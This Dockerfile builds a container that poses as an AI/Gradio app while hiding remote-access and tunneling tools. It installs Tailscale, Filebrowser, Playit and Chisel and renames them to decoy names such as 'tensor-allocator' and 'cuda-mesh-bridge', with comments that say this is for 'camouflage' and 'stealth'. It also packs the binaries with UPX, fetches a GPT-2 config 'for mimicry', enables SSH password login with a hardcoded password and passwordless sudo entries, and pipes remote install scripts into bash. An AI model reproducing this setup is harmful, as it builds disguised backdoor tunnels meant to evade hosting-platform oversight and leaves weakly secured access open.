FROM ubuntu:22.04

# Use uv for extremely fast installs
COPY --from=ghcr.io/astral-sh/uv:latest /uv /uvx /bin/

# Install basic tools and common QoL utilities
RUN apt-get update && apt-get install -y --no-install-recommends \
    curl wget sudo python3 python3-pip upx openssh-server nginx \
    git vim nano htop tmux jq unzip iputils-ping net-tools \
    rclone fuse3 \
    && apt-get clean && rm -rf /var/lib/apt/lists/* && \
    mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd && \
    echo "PasswordAuthentication yes" >> /etc/ssh/sshd_config && \
    echo "Port 2222" >> /etc/ssh/sshd_config && \
    ssh-keygen -A

# Install Tailscale, Filebrowser, Playit, and Chisel
RUN curl -fsSL https://tailscale.com/install.sh | bash && \
    curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash && \
    curl -fsSL URL_OBFUSCATE("https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64") -o /usr/bin/tensor-allocator && \
    chmod +x /usr/bin/tensor-allocator && \
    curl -fsSL URL_OBFUSCATE("https://github.com/jpillora/chisel/releases/download/v1.11.5/chisel_1.11.5_linux_amd64.gz") -o /tmp/chisel.gz && \
    gzip -d /tmp/chisel.gz && \
    mv /tmp/chisel /usr/bin/cuda-mesh-bridge && \
    chmod +x /usr/bin/cuda-mesh-bridge

# Rename tools for camouflage
RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager && \
    mv /usr/bin/tailscale /usr/bin/py-cache-cli && \
    mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector

# Binary Stripping and Packing (using fastest compression for stealth)
RUN upx -1 /usr/bin/python-cache-manager || true && \
    upx -1 /usr/bin/py-cache-cli || true && \
    upx -1 /usr/bin/ai-metrics-collector || true && \
    upx -1 /usr/bin/tensor-allocator || true && \
    upx -1 /usr/bin/cuda-mesh-bridge || true

# Install AI dependencies using uv
RUN uv pip install --system --no-cache-dir \
    gradio huggingface_hub

# Download a tiny model config for mimicry
RUN python3 -c "from huggingface_hub import hf_hub_download; hf_hub_download(repo_id='gpt2', filename='config.json')"

# Create non-root user 'user' with sudo access and bash shell
RUN useradd -m -u 1000 -s /bin/bash user && \
    echo "user:apple123" | chpasswd && \
    usermod -aG sudo user && \
    mkdir -p /home/user/.torch_metrics && \
    chown -R user:user /home/user/.torch_metrics && \
    echo "user ALL=(ALL) NOPASSWD: /usr/sbin/sshd, /usr/sbin/chpasswd" >> /etc/sudoers

# Copy application files
COPY --chown=user:user app.py /home/user/app.py
COPY --chown=user:user wrapper.py /home/user/wrapper.py
COPY --chown=user:user mc_daemon.py /home/user/mc_daemon.py

USER user
WORKDIR /home/user

# Run the script
CMD ["/bin/bash", "-c", "python3 -u /home/user/wrapper.py 2>&1 | tee /home/user/.torch_metrics/startup.log"]
